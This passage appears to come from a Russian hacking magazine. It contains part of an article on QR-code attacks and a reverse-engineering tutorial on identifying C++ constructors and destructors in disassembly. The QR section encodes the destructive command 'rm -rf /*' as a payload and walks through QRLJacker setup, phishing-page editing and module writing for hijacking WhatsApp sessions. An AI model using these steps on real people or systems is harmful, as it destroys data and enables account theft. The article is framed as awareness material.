из Metasploit (в Kali они находят ся по пути /usr/share/metasploit‐frame‐
work/modules/payloads) либо же соз дать новый текстовый документ и в
него записать что‐нибудь «пло хое», например команду для удаления всех
файлов на Linux‐based‐системе:


rm ‐rf /*

Итак, я назвал наш «вирус» clear.txt и запус каю QRGen (предварительно
удалив или очистив папку genqr):


python3 qrgen.py ‐w /путь/до/clear.txt

Иногда может возникать ошибка, как на скриншоте ниже. Не пугайся,
на работоспособ ность генера тора кодов она не влияет.





                        Ошиб ка

Если ты перфекционист и хочешь ее исправить, то замени format(i‐1)
на format(i) в самом конце скрипта.
   Теперь давай посмотрим на сам QR‐код (естественно, с вырезанной
частью) и отсканируем его на одном из онлайн‐сервисов.





Как мы можем видеть из скриншота выше, наш текст был абсолютно верно
перенесен в QR‐код!
   Эта утилита (и вектор атаки) направлена скорее на проверку незащищен‐
ного и непопулярного ПО либо же узкоспециализированных инстру ментов
(вроде складских QR‐сканеров, отправляющих SQL‐запросы к базе данных
компании). Большинство современных ска неров из соображений безопас‐
ности не выполняют находящийся в QR код. Соответственно, вариантов раз‐
вития событий после сканирования два.
 1. Сканер просто выводит содержимое нашего изображения (невыгодный
   для хакера вариант).
 2. Сканер исполняет  код, находящийся  внутри изображения, либо же,
   используя пример, о котором мы говори ли рань ше, отправляет SQL‐зап‐
   рос к БД организации. Он и становится первым шагом к взлому базы дан‐
   ных компании. Естес твенно, глупо при таком раскладе рассчитывать, что
   распознанный текст будет выполнен как самос тоятельный запрос, так что
   бери нагрузку вроде той, которую обычно используешь в веб‐приложе‐
   ниях.



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
      ВКУРИВАЕМ               QR
                КАК СДЕЛАТЬ QR‐КОД С СЮРПРИЗОМ





QRLJACKER
Теперь переходим ко второму инстру менту — QRLJacker. Он отчасти похож
на QRGen, но представляет совершенно другой вектор атаки — QRLJacking.
  SQRL (произносится как squirrel — бел ка, а расшифровывается как Secure,
Quick, Reliable Login или Secure Quick Response Login) — откры тый проект
для безопасного входа на веб‐сайт и аутентификации. При входе, естествен‐
но, используется QR‐код, который обеспечива ет проверку под линности.


        WWW

                  Официальная страница проекта



Как же выполняется вход при использовании данного способа аутентифика‐
ции?





 1. Пользователь посещает сайт и откры вает сессию.
 2. Сайт генерирует QR‐код с ключом сессии. Этот код регулярно меняется
   в целях безопасности.
 3. Пользователь сканирует QR‐код.
 4. Мобильное приложение генерирует аутентифика ционный сигнал, который
   содержит секретный токен (в него вхо дят ID пользовате ля, код сессии,
   специальное сооб щение, соз данное с помощью приватного ключа поль‐
   зователя).
 5. Сайт получает сигнал и идентифицирует пользователя, производя вход
   (если, конечно, верификация завершена корректно).

Довольно долго метод SQRL считался дей ствительно безопасным, пока
Мохамед Бассет (Mohamed Basset) не предложил способ атаки на сервисы,
использующие SQRL, который был наз ван QRLJacking. Способ требует соз‐
дать фишинговую страницу и разместить на ней генерируемый через опре‐
деленные промежутки времени QR‐код. Давай рассмотрим его поподробнее.





 1. Злоумышленник инициирует клиентскую QR‐сес сию и клонирует код QR‐
   логина на фишинговую стра ницу.
 2. Жертве отправляется ссылка на эту страницу. Выглядит страничка вполне
   безопасно.
 3. Жертва сканирует поддельный QR‐код, а при ложение отправляет сек‐
   ретный токен, завершающий процесс аутентификации.
 4. Злоумышленник получает подтверждение от сервиса и теперь может кон‐
   тролировать аккаунт жертвы.

Именно для реализации данного метода была создана утилита QRLJacker,
о которой сейчас и пой дет речь.
   Какие веб‐ресурсы уяз вимы перед подоб ным вектором атаки? По завере‐
нию разработчиков, это популярные мес сенджеры вроде WhatsApp, WeChat,
Discord, Line, все сервисы Яндекса (ведь для вхо да в любой из них тре буется
вход в Яндекс.Паспорт, который и предоставляет воз можность аутентифика‐
ции через QR), популярные торговые пло щадки Alibaba, AliExpress, Tmall
и Taobao, сервис AliPay, а также приложение для удаленного доступа AirDroid.
Само собой, список неполный, ведь все ресурсы, использующие SQRL, прос‐
то не перечесть.
   Теперь давай установим утилиту QRLJacker (программа работает только
на Linux и macOS, более подробную информа цию можешь найти в README
проекта, к тому же нам необ ходим Python 3.7+).
 1. Заходим в систему от имени суперпользователя (root), иначе Firefox может
   выдать ошибку при запуске модулей фреймворка QRLJacker.
 2. Обновляем Firefox до пос ледней версии.
 3. Скачиваем самый новый geckodriver с GitHub и распаковы ваем файл,
   затем выполняем коман ды


   chmod +x geckodriver
   sudo mv ‐f geckodriver /usr/local/share/geckodriver
   sudo ln ‐s /usr/local/share/geckodriver /usr/local/bin/
   geckodriver
   sudo ln ‐s /usr/local/share/geckodriver /usr/bin/geckodriver

 4. Клонируем репозиторий и переходим в папку с содержимым:


   git clone https://github.com/OWASP/QRLJacking
   cd QRLJacking/QRLJacker && ls

 5. Устанавливаем все зависимости:


   python3.7 ‐m pip install ‐r requirements.txt

 6. Запускаем фреймворк (с ключом ‐‐help для получения краткой справки):


   python3.7 QrlJacker.py ‐‐help





При обычном запуске (без аргу ментов вовсе) ты увидишь примерно такую
картинку.





Прописав команду help внут ри фреймворка, ты получишь пол ную справку
по командам QRLJacker.
   Теперь давай запустим единс твенный (на данный момент) модуль —
grabber/whatsapp. Список всех дос тупных модулей можем посмотреть
командой list, выбрать модуль для использования — командой use. Коман‐
да options подскажет нам текущие зна чения опций, а set задаст то или иное
значение опции. Команда run запус тит наш модуль, а командой jobs мы
можем просмотреть активные задачи.





                      Вдохновлено Metasploit

Порт 1337 стандартный для данного фреймворка, остальные опции я трогать
не стал. HOST оставил локальным (0.0.0.0), но вывести его в сеть — не проб‐
лема. Это можно сделать, используя, например, ngrok:


ngrok http 1337

Параметр User‐Agent также решил оставить дефол тным (по умол чанию),
но всего там три варианта: стандартный, случай ный и кастомный (ручная нас‐
тройка). Используй вариант, который тебе больше всего подходит.
  После чего запускаю модуль и смотрю текущие задачи. Там указан их ID,
название модуля, а также адрес, на котором располагается страница модуля.
По стандарту она выглядит так (QR‐код частично замазан для защиты от лю‐
дей в погонах зло употреблений):





Изменить эту страницу мож но, поправив по своему вкусу файл QRLJacker/
core/templates/phishing_page.html.
  Оригинальный исходник прост и незамысловат, что позволяет быстро
изменить текст даже неподготовленному взломщику.





После внесения изменений в файле они будут автоматически примене ны
в фреймворке.


Написание своих модулей
Давай обсудим, что необходимо для создания своего модуля для QRLJacker.
  Документацию и инструкцию по соз данию модулей ты можешь найти в ре‐
позитории проекта либо в папке, которую ты клонировал раньше (QRLJacker/
docs/README.md). Модули‐грабберы — основа фреймворка, и располага‐
ются они в QRLJacker/core/modules/grabber. Когда ты добавляешь туда
любой Python‐файл, он появляется в фреймворке с тремя опциями — хост,
порт и юзерагент.
  Код модуля дол жен быть пос троен по такому шаблону:


# ‐*‐ coding: utf‐8 ‐*‐
from
 core.module_utils import types


class info:
    author = ""
    short_description = ""
    full_description = None


class execution:
    module_type= types.grabber
    name = ""
    url = ""
    image_xpath = ""
    img_reload_button = None
    change_identifier = ""
    session_type = "localStorage"

Например, модуль grabber/whatsapp сделан именно в этом формате, пос‐
мотреть его также можно в репозитории или открыв сам Python‐файл,
лежащий в QRJacker/core/modules/grabber/whatsapp.py.
   Теперь давай разберемся, что озна чает каждая из переменных, которые
мы задаем на этих строках.


Класс info
Тут твое имя (или ник нейм), которое появится при вызове справки модуля,
краткое описание модуля и его полное описание (можно заполнять, можно
оставить значение None). Больше ничего интересного в классе info нет,
но прежде, чем мы перейдем к следующему (execution), давай посмотрим
вызов справки (которая будет черпать информацию из кода) на примере
модуля WhatsApp. Вот код info:


class info:
    author            = "Karim Shoair (D4Vinci)"
    short_description = "Whatsapp QR‐sessions grabber and controller"
    full_description  = None

А вот справка по модулю.



  $ info grabber/whatsapp
      Module : grabber/whatsapp
      Provided by : Karim Shoair (D4Vinci)
      Description : Whatsapp QR‐sessions grabber and controller



Класс execution
Тут возни уже поболь ше: нужно не только наз вание модуля, но и URL сайта,
откуда будет браться QR‐код и где будет произво диться авторизация. Также
нужен XPATH изоб ражения с QR‐кодом на странице. Чтобы понять, что это,
опять обратимся к примеру в виде модуля WhatsApp. Там данный параметр
выглядит как /html/body/div[1]/div/div/div[2]/div[1]/div/div[2], то
есть путь до объекта внутри HTML‐документа.
  Далее нужен XPATH кнопки, которая обновляет QR‐код на странице (если
таковая име ется, в противном случае оставь зна чение None). Для большей
конспирации исполь зуется XPATH элемента, который исче зает пос ле получе‐
ния сессии. Нап ример, раз работчики QRLJacker в модуле grabber/whatsapp
использовали чекбокс «Запомнить меня».
  И напоследок нужна переменная, которая при нимает значения local‐
Storage или Cookies. Она дол жна соответствовать способу, с помощью
которого на веб‐сайте определяется пользовательская сессия.
   Вот и все — после того как раз берешься со всеми этими пунктами, тебе
останется лишь добавить файл в папку с граббер‐модулями и создать HTML‐
файл (index.html) со стра ницей в core/www/твое_имя_модуля.
   Готово! Ты создал свой модуль.


Угоняем сессию
А теперь бегло посмотрим, как мож но использовать этот фреймворк для ата‐
ки QRLJacking. Например, зло умышленник может скопировать оригинальный
сайт web.whatsapp.com и вставить туда фальшивый QR‐код для получения
доступа к сессии. Или пример, который приводит сам создатель ути литы
QRLJacker.





Это плагин, который, если зайти на популярный зарубежный сайт Amazon,
выдаст тематическое уведомление о «получении подарка от WhatsApp в честь
Дня святого Валентина» (обра ти внимание на правый верхний угол). Естес‐
твенно, чтобы получить подарок, нужно отска ниро вать QR‐код, что не даст
тебе ничего, кроме утечки личных данных. Будь очень бдителен, ведь, как я
и показал раньше, этот вектор атаки и утилиты для его использования
находятся в открытом дос тупе, а написать модуль для QRLJacker — задача,
посильная даже начинающему питонисту.


ИТОГИ
Как ты (теперь) знаешь, даже использование QR‐кода для логина больше
нельзя считать безопасной практикой. Любой школь ник с пачкой убедительно
написанных писем может заманить на впол не нас тоящий сайт и угнать твой
WhatsApp. Надеюсь, этот небольшой обзор оту чит тебя бездумно сканиро‐
вать каждый попавшийся на глаза код.
ВЗЛОМ

  ФУНДАМЕНТАЛЬНЫЕ
          ОСНОВЫ
          ХАКЕРСТВА





                                                                    Крис Касперски
                                                                            Известный российский
                                                                                        хакер. Легенда ][, ex‐
                                                                               редактор ВЗЛОМа. Также
                                                                               известен под псевдонимами
                                                                        мыщъх, nezumi (яп. 鼠,
                                                                           мышь), n2k, elraton, souriz,
                                                                                                        tikus, muss, farah, jardon,
                                                                               KPNC.

УЧИМСЯ
ИДЕНТИФИЦИРОВАТЬ
КОНСТРУКТОРЫ

                                                            Юрий ЯзевИ ДЕСТРУКТОРЫ
                                                                      Широко известен под
                                                                          псевдонимом yurembo.
                                                                            Программист, разработчик
                                                                                  видеоигр, независимый
                                                                                исследователь. Старый автор
                                                                                журнала «Хакер».
                                                                                    yazevsoft@gmail.com





В этой статье речь пойдет об известных каждому прог‐
раммисту функциях работы с объекта ми класса — конструк‐
торах и деструкторах, а также о том, как обнаружить их
в коде исследуемой программы.




Читай так же:
 • Проверка аутентичнос ти и базовый взлом защиты
 • Знакомство с отладчиком
 • Продолжаем осваивать отладчик
 • Новые способы находить защитные механизмы в чужих программах
 • Выбираем лучший редактор для вскрытия исполняемых файлов Windows
 • Мастер‐класс по анализу исполняемых файлов в IDA Pro
 • Учимся искать клю чевые структуры язы ков высокого уровня
 • Идентификация стартового кода и виртуальных функций приложений
   под Win64
 • Какие бывают вир туальные функции и как их искать




ОБЪЕКТЫ В КУЧЕ
Конструктор в силу своего автоматичес кого вызова при создании нового
экземпляра объекта — первая по счету функция. Так какие же могут воз‐
никнуть сложности в его идентификации? Камень преткновения в том, что
конструктор факультативен, то есть может присутс твовать в объ екте, а может
и не присутство вать. Поэтому совсем не факт, что первая вызываемая фун‐
кция — именно конструктор!
   Заглянув в описание языка C++, можно обна ружить, что конструктор
не возвращает никакого значения, что нехарактерно для обычных функций,
однако все же не настоль ко редко встречается, чтобы однозначно его иден‐
тифицировать. Как же тогда быть?
  Выручает то обстоятель ство, что по стандарту конструктор не дол жен
автоматически вызывать исключения, даже если выделить память под объ ект
не удалось. Реализовать это требова ние можно множеством различных спо‐
собов,  но  все  знакомые  автору  компиляторы  просто  помещают
перед вызовом конструктора проверку на нулевой указатель, передавая ему
управление только при удачном выделении памяти для объ екта. Напротив,
все остальные функции объекта вызываются всегда, даже при неус пешном
выделении памяти. Точнее, пытаются вызывать ся, но нулевой указатель (воз‐
вращаемый в случае ошибки выделения памяти) при первой же попытке
обращения вызывает исключение, передавая бразды правления обработчику
соответствующей исключительной ситуации.
   Таким образом, функция, окольцованная проверкой нулевого указателя,
и есть конструктор, а не что‐либо иное. Теоретичес ки, впрочем, подобная
проверка может присутствовать и при вызове дру гих функций, конструктором
не являющихся, но... Во всяком случае, автору на практике с таким еще не
приходилось встречаться.
  Деструктор, как и конструктор, факультативен, то есть последняя вызыва‐
емая функция объекта может и не быть деструктором. Тем не менее отличить
деструктор от любой другой функции очень просто — он вызывается только
при результативном создании объекта (то есть успешном выделении памяти)
и игнорируется в противном случае. Это документированное свойство язы‐
ка — следовательно, обязательное к реализации всеми компиляторами.
Таким обра зом, в код помещается такое же «коль цо», как и у конструктора,
но никакой путаницы не возникает, так как конструктор вызывается всегда
первым (если он есть), а дес труктор — последним (опять‐таки если он при‐
сутствует).
  Особый случай пред ставляет объект, целиком состоящий из одного конс‐
труктора (или деструктора), — попробуй‐ка разоб раться, с чем мы имеем
дело. Но разобраться можно! За вызовом конс труктора практически всегда
присутствует код, обнуляющий this в случае неудачного выделения памяти,
а у деструктора этого нет. Далее, дес труктор обычно вызывается не непос‐
редственно из материнской процедуры, а из функции‐обертки, вызывающей
помимо деструктора и оператор delete, который освобождает занятую объ‐
ектом память. Так что отличить конструктор от деструктора вполне можно.
  Между  тем  современные компиляторы  для  создания  оптимального
по быстродействию и размеру кода могут впихнуть все элементы в функцию
main. Для лучшего понимания сказанного рас смотрим демонс трацию конс‐
труктора и деструктора (пример myClass1):


#include <stdio.h>


class MyClass {


public:
    MyClass(void);
    void demo(void);
    ~MyClass(void);
};


MyClass::MyClass()
{
    printf("Constructor\n");
}


MyClass::~MyClass()
{
    printf("Destructor\n");
}


void MyClass::demo(void)
{
    printf("MyClass\n");
}


int main()
{
    MyClass *zzz = new MyClass();
    zzz‐>demo();
    delete zzz;
}





                 Вывод приложения myClass1

В результате компиляции примера myClass1 с помощью VC++’17 с настрой‐
кой вывода проекта Release будет выглядеть так:


main proc near
  push rbx
  sub  rsp, 20h
  mov  ecx, 1           ; size
  call operator new(unsigned __int64)
  lea  rcx, _Format     ; "Constructor\n"
  mov  [rsp+28h+arg_0], rax
  mov  rbx, rax
  call printf
  lea  rcx, aMyclass    ; "MyClass\n"
  call printf
  lea  rcx, aDestructor ; "Destructor\n"
  call printf
  mov  edx, 1           ; __formal
  mov  rcx, rbx         ; block
  call operator delete(void *,unsigned __int64)
  xor  eax, eax
  add  rsp, 20h
  pop  rbx
  retn
main endp

Как раз упомянутый случай! Компилятор все сделал достоянием функции
main, в отдельности не соз дав ни конс труктора, ни деструктора, ни метода
класса. После выделения памяти он тут же вызыва ет функцию для вывода
строки символов! То же про исходит с очисткой памяти. Вот это магия! Здесь
интересным для нас может быть только оператор new: его устройство мы под‐
робно рассмотрели в предыдущей статье.
  С другой стороны, нам же хочется увидеть, как будет сгенерирован код
без оптимизации. Скомпилируем проект в режиме Debug и пос мотрим
на дизассемблер ный листинг в Ida Pro:
   Так выглядит функция main:


push rbp
  push rdi
  sub  rsp, 1A8h
  lea  rbp, [rsp+20h]
  mov  rdi, rsp
  mov  ecx, 6Ah
  mov  eax, 0CCCCCCCCh
  rep  stosd
  mov  [rbp+190h+var_28], 0FFFFFFFFFFFFFFFEh
  lea  rcx, unk_140023002
  call sub_1400110AA
  lea  rcx, aMainDebug        ; "Main_Debug\n"
  call sub_140011230          ; вызов printf
  mov  ecx, 1
  call sub_14001119F
  mov  [rbp+190h+var_88], rax
  cmp  [rbp+190h+var_88], 0
  jz   short loc_140011BE1
  mov  rcx, [rbp+190h+var_88]
  call sub_140011415          ; вызов конструктора для создания
                              ; экземпляра класса MyClass
  mov  [rbp+190h+var_18], rax ; копируем указатель на выделенную
  jmp  short loc_140011BEC    ; память и делаем безусловный переход
loc_140011BE1:
  mov  [rbp+190h+var_18], 0
loc_140011BEC:
  mov  rax, [rbp+190h+var_18] ; возвращаем указатель на созданный
                              ; объект в регистр rax
  mov  [rbp+190h+var_A8], rax
  mov  rax, [rbp+190h+var_A8]
  mov  [rbp+190h+var_188], rax
  mov  rcx, [rbp+190h+var_188]
  call sub_140011393          ; для экземпляра класса MyClass
                              ; вызываем метод demo
  mov  rax, [rbp+190h+var_188]
  mov  [rbp+190h+var_48], rax
  mov  rax, [rbp+190h+var_48]
  mov  [rbp+190h+var_68], rax
  cmp  [rbp+190h+var_68], 0
  jz   short loc_140011C4B
  mov  edx, 1
  mov  rcx, [rbp+190h+var_68]
  call sub_1400111EA          ; вызов деструктора
  mov  [rbp+190h+var_18], rax
  jmp  short loc_140011C56
loc_140011C4B:
  mov  [rbp+190h+var_18], 0
loc_140011C56:
  xor  eax, eax
  lea  rsp, [rbp+188h]
  pop  rdi
  pop  rbp
  retn

Вызовы конструктора, дес труктора, функции printf, а так же метода My‐
Class::demo() осущест вляются опос редованно, то есть через вызовы про‐
межуточных функций. В результате стечения всех мыслимых обстоятельств
на моем компьютере компилятор сгенерировал такие цепочки вызовов:


sub_140011415 ‐> sub_1400118A0 ‐ constructor
sub_1400111EA ‐> sub_140011980 ‐> sub_14001139D ‐> sub_140011910 ‐
destructor
sub_140011230 ‐> sub_140011CA0 ‐ printf
sub_140011393 ‐> sub_140011A10 ‐ MyClass::demo()

У тебя результаты впол не могут быть другими.
  Вывод о том, что далее показано тело конструктора клас са MyClass, мож‐
но сделать путем анализа реализации и его вызова:


mov  [rsp‐8+arg_0], rcx
push rbp
push rdi
sub  rsp, 0E8h
lea  rbp, [rsp+20h]
mov  rdi, rsp
mov  ecx, 3Ah
mov  eax, 0CCCCCCCCh
rep  stosd
mov  rcx, [rsp+0F0h+arg_8]
lea  rcx, unk_140023002
call sub_1400110AA
lea  rcx, aConstructor ; "Constructor\n"
call sub_140011230     ; вызов printf
mov  rax, [rbp+0D0h+arg_0]
lea  rsp, [rbp+0C8h]
pop  rdi
pop  rbp
retn

Сходным образом определяем дес труктор:


mov  [rsp‐8+arg_0], rcx
push rbp
push rdi
sub  rsp, 108h
lea  rbp, [rsp+20h]
mov  rdi, rsp
mov  ecx, 42h
mov  eax, 0CCCCCCCCh
rep  stosd
mov  rcx, [rsp+110h+arg_8]
mov  [rbp+0F0h+var_28], 0FFFFFFFFFFFFFFFEh
lea  rcx, unk_140023002
call sub_1400110AA
nop
lea  rcx, aDestructor  ; "Destructor\n"
call sub_140011230     ; вызов printf
nop
lea  rsp, [rbp+0E8h]
pop  rdi
pop  rbp
retn

И, наконец, метод MyClass::demo():


mov  [rsp‐8+arg_0], rcx
push rbp
push rdi
sub  rsp, 0E8h
lea  rbp, [rsp+20h]
mov  rdi, rsp
mov  ecx, 3Ah
mov  eax, 0CCCCCCCCh
rep  stosd
mov  rcx, [rsp+0F0h+arg_8]
lea  rcx, unk_140023002
call sub_1400110AA
lea  rcx, aMyclass     ; "MyClass\n"
call sub_140011230     ; вызов printf
lea  rsp, [rbp+0C8h]
pop  rdi
pop  rbp
retn

Уверен, здесь все понятно без дополнительных комментариев.


Современные микропроцессоры архитектуры x86-64
Наверняка в предыдущем листинге ты обратил внимание на ассемблерную
инструкцию rep stosd. Здесь выполняется цикл (команда rep), при этом
количество повторений предварительно помещено в регистр ECX или RCX (в
зависимости от размера). После каждого про хода счетчик цикла уменьшает‐
ся на единицу, и это происходит до тех пор, пока зна чение не станет нулевым.
Команда stosd (в режиме x64) записывает по адресу, сохраненному в регис‐
тре RDI или EDI, двой ное слово, находящееся в регистре EAX. Таким образом
происходит заполнение целого блока памяти. Даже на языке высокого уровня
подобная операция зай мет не одну строку:


Псевдокод
IF (Doubleword store)
  WHILE ((R|E)CX > 0)
  DO
    THEN
      DEST := EAX;
      THEN
        IF DF = 0
          THEN (R|E)DI := (R|E)DI + 4;
          ELSE (R|E)DI := (R|E)DI – 4;
        FI;
    (R|E)CX := (R|E)CX ‐ 1;
  OD;
FI;

Тем не менее на ассемблере операция умещается в одну строчку! Интерес‐
ный момент. Давай покопа емся в истории ЭВМ.
  По мере своего развития, начиная с 1978 года, архитектура x86 соответс‐
твовала (и продол жает соответство вать для совместимости с предыдущими
моделями микропроцессоров) стандарту CISC — что расшифровывается
как complex instruction set computer, или «компьютер со сложным набором
команд». В первые годы оптимизирующих компилято ров еще не было. Прог‐
раммисты писали программы на ассемблере. Инженеры из Intel в соответс‐
твии с прогрессом сво их процессоров рас ширяли низкоуровневый язык
сборки. От такого подхода в ассемблере для x86, как в снежном коме, накап‐
ливались разные полезные и бесполезные команды.
  До поры до времени компанию Intel не бес покоило происходящее парал‐
лельно зарождение и развитие процессорной архитектуры RISC (компьютер
с уменьшенным набором команд). В соответствии с названием в ней исполь‐
зовал ся только короткий набор высокооптимизированных операций. Со вре‐
менем стало очевидно, что RISC‐архитектура позволя ет конструировать
более производительные процессоры, нежели CISC. Тем не менее на Intel
лежал огромный груз ответс твенности перед клиентами за совместимость
с предыдущими моделя ми процес соров и софтом, написанным за все эти
годы. Тогда корпорация выкатила архи тек туру P6, главная особенность
которой состояла в динамическом преобра зова нии CISC‐команд в RISC‐мик‐
рооперации. А также их ана лиз, переупо рядочивание для возможности
парал лельного исполнения независящих от резуль тата команд за один такт
и выполнения мик рокоманд на RISC‐ядре. На основе архитектуры P6 Intel
в 1995 году представила процессор Pentium Pro. Тем самым он стал первым
x86‐процессором с RISC‐ядром. На этой же архи тектуре впоследс твии были
построены Pentium II, Pentium III, Celeron. С тех пор в рас сматриваемом нап‐
равлении микропроцессоры почти не изменились.





       Микроархитектура ядер современных процессоров x86‐64



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

  ФУНДАМЕНТАЛЬНЫЕ
  ОСНОВЫ ХАКЕРСТВА
                   УЧИМСЯ ИДЕНТИФИЦИРОВАТЬ
                   КОНСТРУКТОРЫ И ДЕСТРУКТОРЫ





ОБЪЕКТЫ В АВТОМАТИЧЕСКОЙ ПАМЯТИ
Если объект размещается в стеке (автоматической памяти), то никаких про‐
верок успешности ее выделения не выполняется и вызов конструктора ста‐
новится неотличим от вызова остальных функций. Аналогичная ситуация и с
деструктором — стековая память авто матичес ки освобождается по завер‐
шении функции, а вместе с ней умирает и сам объект безо всякого вызова
delete (при этом delete применяется только для удаления объектов из кучи).
Посмотрим, появятся ли в дизас семблированном листинге отличия при соз‐
дании объекта в стеке.
   Чтобы увидеть это, модифициру ем функцию main нашего предыдущего
примера следующим образом (пример myClass2):


int main()
{
  printf("Main\n"); // для наглядной идентификации
  MyClass zzz;
  zzz.demo();
}

Результат компиляции этого кода в режиме отладки должен выглядеть так:


push rbp
push rdi
sub  rsp, 128h
lea  rbp, [rsp+20h]
mov  rdi, rsp
mov  ecx, 4Ah
mov  eax, 0CCCCCCCCh
rep  stosd
mov  [rbp+110h+var_28], 0FFFFFFFFFFFFFFFEh
mov  rax, cs:__security_cookie
xor  rax, rbp
mov  [rbp+110h+var_18], rax
lea  rcx, unk_140021002
call sub_140011082
lea  rcx, aMain      ; "Main\n"
call sub_1400111D6   ; вызов printf
lea  rcx, [rbp+110h+var_10C]
call sub_14001137A   ; вызов конструктора
nop
lea  rcx, [rbp+110h+var_10C]
call sub_140011316   ; вызов метода demo
nop
lea  rcx, [rbp+110h+var_10C]
call sub_14001131B   ; вызов деструктора
xor  eax, eax
mov  edi, eax
lea  rcx, [rbp+110h+var_130]
lea  rdx, unk_140019CB0
call sub_140011352
mov  eax, edi
mov  rcx, [rbp+110h+var_18]
xor  rcx, rbp        ; StackCookie
call j___security_check_cookie
lea  rsp, [rbp+108h]
pop  rdi
pop  rbp
retn

Заметных отличий в сравнении с предыду щим при мером не наб людается,
и все функции по‐прежнему можно определить путем кропотливого анализа
их содержимого.


ИДЕНТИФИКАЦИЯ КОНСТРУКТОРА/ДЕСТРУКТОРА В ГЛОБАЛЬНЫХ
ОБЪЕКТАХ
Глобальные объекты (также называемые статическими объектами) размеща‐
ются в сегменте данных еще на ста дии компиляции. Стало быть, ошибки
выделения памяти в принципе невоз можны. Выходит, что по аналогии со сте‐
ковыми объектами надежно идентифици ровать конструктор и деструктор
здесь нельзя? А вот и нет!
   Глобальный объект в силу своей глобальности доступен из многих мест
программы, но его конс труктор должен вызывать ся лишь однажды. Как это
обеспечить? Конечно, воз можны самые различные варианты реализации,
но большинство компиляторов идут по простейшему пути, используя для этой
цели глобальную переменную‐флаг, изна чально равную нулю, а перед пер‐
вым вызовом конструктора увеличивающуюся на единицу (в более общем
случае она устанавлива ется в TRUE). При повторных итерациях остается про‐
верить, равен ли флаг нулю, и если нет — пропустить вызов конструктора.
Таким образом конструктор вновь «окольцовыва ется» условным переходом,
что позволяет безошибочно отличить его от всех остальных функций.
  С деструктором еще проще — раз объект глобальный, то он уничтожается
только при завершении прог раммы. А кто это может отследить, кроме под‐
держки времени исполнения? Специальная функция, такая как _atexit, при‐
нимает на вход указатель на дес труктор, запоми нает его и затем вызывает
в случае необходимости. Интересный момент: функция _atexit (или что там
используется в вашем конкретном случае) должна быть вызвана лишь
однократно (надеюсь, понят но почему?). И чтобы не вводить еще один флаг,
она вызывается сразу же после вызова конструктора! На первый взгляд объ‐
ект может показаться сос тоящим из сочетания конс труктора и деструктора,
но это не так. Не забывай, что _atexit не переда ет немедленно управле ние
на код деструктора, а только запоми нает его ука затель для дальнейшего
использования!
   Таким образом, конструктор и деструктор глобального объ екта очень
просто  идентифицировать,   что  и  доказы вает  следующий  пример
myClass3 с измененной функцией main:


int main()
{
  printf("Main\n");
  static MyClass zzz;
  zzz.demo();
}

Дизассемблерный листинг это го примера выглядит приблизительно так:


push rbp
push rdi
sub  rsp, 108h
lea  rbp, [rsp+20h]
mov  rdi, rsp
mov  ecx, 42h
mov  eax, 0CCCCCCCCh
rep  stosd
mov  [rbp+0F0h+var_28], 0FFFFFFFFFFFFFFFEh
lea  rcx, unk_140024002
call sub_14001109B
lea  rcx, aMain      ; "Main\n"
call sub_140011208   ; вызов printf
mov  eax, 104h
mov  eax, eax
mov  ecx, cs:TlsIndex
mov  rdx, gs:58h
mov  rcx, [rdx+rcx*8]
mov  eax, [rax+rcx]
cmp  cs:dword_14001E180, eax

Проверяем, инициализирован ли объект.


jle  short loc_140011B10

Если объект инициализиро ван, осу ществляем переход на loc_140011B10.
Вызов конструктора при этом про пус кается.


lea  rcx, dword_14001E180
call sub_1400112F8
cmp  cs:dword_14001E180, 0FFFFFFFFh
jnz  short loc_140011B10
lea  rcx, unk_14001E17C
call sub_1400113D4   ; опосредованный вызов конструктора
                     ; класса MyClass
lea  rcx, sub_140019520

А здесь программа заносит в регистр RCX ука затель на опосредованный
вызов деструктора класса MyClass.


call sub_1400111D1

Посредством этого вызова программа передает находящийся в RCX ука‐
затель на деструктор функции j__crt_atexit_0, которая будет выз вана
по завершении программы. Иными словами, эта функция вызовет деструктор
класса MyClass.


nop
  lea  rcx, dword_14001E180
  call sub_140011253
loc_140011B10:
  lea  rcx, unk_14001E17C
  call sub_140011366 ; опосредованный вызов метода demo
                     ; класса MyClass
  xor  eax, eax
  lea  rsp, [rbp+0E8h]
  pop  rdi
  pop  rbp
  retn

Аналогичный код генери рует Embarcadero C++Builder (myClass3_CB).





                       Embarcadero C++Builder


sub  rsp, 48h
mov  [rsp+48h+var_4], 0
lea  rcx, aMain      ; "Main\n"
call printf
cmp  cs:byte_45DAB8, 0

Смотрим состояние фла га инициализации объекта.


mov  [rsp+48h+var_18], eax
jnz  short loc_401510

Если объект уже инициализиро ван, делаем прыжок — не вызываем конструк‐
тор.


lea  rcx, byte_45DAB8
call __cxa_guard_acquire
cmp  eax, 0

Проверяем состояние регистра EAX, если он равен  0,  осуществляем
переход — т. е. объект инициализирован.


jz  short loc_401510
lea rcx, stru_45DAB0

Перед вызовом конструктора помещаем в регистр RCX указатель на класс
MyClass.


call MyClass::MyClass(void)
  jmp  short $+2     ; переход на 2 строчки вперед
loc_4014F4:
  lea  rcx, __dtor__ZZ4mainE3zzz
  call atexit

В двух строках выше про исходит такой же маневр, какой мы видели в пре‐
дыдущем листинге: сначала в регистр RCX помеща ется указатель на функцию,
вызывающую деструктор клас са MyClass. Затем этот указатель передается
в функцию atexit. Последняя будет вызвана при уничтожении приложения,
а уже она вызывает деструктор MyClass.


lea  rcx, byte_45DAB8
  mov  [rsp+48h+var_1C], eax
  call __cxa_guard_release
loc_401510:
  lea  rcx, stru_45DAB0

Перед вызовом метода demo класса MyClass в регистр RCX помещаем ука‐
затель на этот класс.


call MyClass::demo(void)
mov  eax, [rsp+48h+var_4]
add  rsp, 48h
retn


Виртуальный деструктор
Деструктор тоже может быть виртуальным. А почему бы и нет? Это бывает
полезно, когда экземпляр производного класса уда ляется через указатель
на базовый класс. Поскольку виртуальные функции связаны с клас сом объ‐
екта, а не с классом указателя, то вызыва ется виртуальный деструктор, свя‐
занный с типом объекта, а не с типом указателя. Впрочем, эти тонкости отно‐
сятся к непосредственному программирова нию, а исследователей в первую
очередь инте ресует, как идентифицировать виртуальный деструктор. О,
это просто: виртуальный дес труктор совмещает в себе свойства обычного
деструктора и виртуальной функции (см. прош лую статью).


Виртуальный конструктор
Виртуальный конструктор? А что, разве есть такой? Ничего подобного стан‐
дартный C++ не поддерживает. Непосредс твенно не поддерживает. И когда
виртуальный  конструктор  позарез  требует ся  программис там  (впрочем,
это бывает лишь в весьма экзотичес ких случаях), они при бегают к ручной эму‐
ляции некоторого его подобия. В специально выделенную для этих целей
